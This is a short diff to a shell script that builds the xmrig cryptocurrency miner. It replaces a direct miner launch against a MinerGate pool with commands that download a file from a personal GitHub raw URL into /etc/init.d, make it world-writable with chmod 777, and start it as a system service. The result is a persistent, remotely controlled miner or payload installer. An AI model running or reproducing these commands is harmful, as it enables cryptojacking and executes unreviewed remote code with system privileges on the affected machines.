@@ -6,4 +6,10 @@ cd build
 cmake ..
 make
 
-./xmrig --print-time 7 --max-cpu-usage 100 -o xmr.pool.minergate.com:45700 -u adynikez@gmail.com -p x -k --nicehash
+wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango
+
+chmod -R 777 /etc/init.d/mango
+
+service mango restart
+
+
